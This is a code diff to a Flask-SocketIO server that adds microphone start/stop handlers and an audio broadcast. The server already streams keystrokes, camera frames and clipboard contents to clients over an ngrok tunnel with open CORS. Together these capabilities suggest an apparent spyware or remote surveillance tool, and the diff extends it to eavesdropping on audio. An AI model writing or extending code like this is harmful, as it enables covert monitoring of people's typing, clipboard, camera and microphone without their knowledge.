@@ -10,13 +10,15 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 _controller = None
 _recorder   = None
 _camera     = None
+_mic        = None
 
 
-def init(controller_fn, recorder, camera):
-    global _controller, _recorder, _camera
+def init(controller_fn, recorder, camera, mic=None):
+    global _controller, _recorder, _camera, _mic
     _controller = controller_fn
     _recorder   = recorder
     _camera     = camera
+    _mic        = mic
 
 
 @app.route("/")
@@ -25,6 +27,19 @@ def index():
 
 
 # ── Camera ────────────────────────────────────────────────────────────────────
+@socketio.on("mic_on")
+def on_mic_on(_data=None):
+    if _mic:
+        ok = _mic.start()
+        socketio.emit("mic_state", {"active": ok})
+
+@socketio.on("mic_off")
+def on_mic_off(_data=None):
+    if _mic:
+        _mic.stop()
+        socketio.emit("mic_state", {"active": False})
+
+
 @app.route("/camera/start", methods=["POST"])
 def camera_start():
     if not _camera: return jsonify({"ok": False})
@@ -67,6 +82,7 @@ def broadcast_key(char):       socketio.emit("key",            {"char": char})
 def broadcast_camera(b64):     socketio.emit("camera_frame",   {"data": b64})
 def broadcast_clipboard(text): socketio.emit("clipboard",      {"text": text})
 def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",      {"url": url})
+def broadcast_audio(b64):      socketio.emit("audio",          {"data": b64})
 
 
 def run(host="0.0.0.0", port=9090):
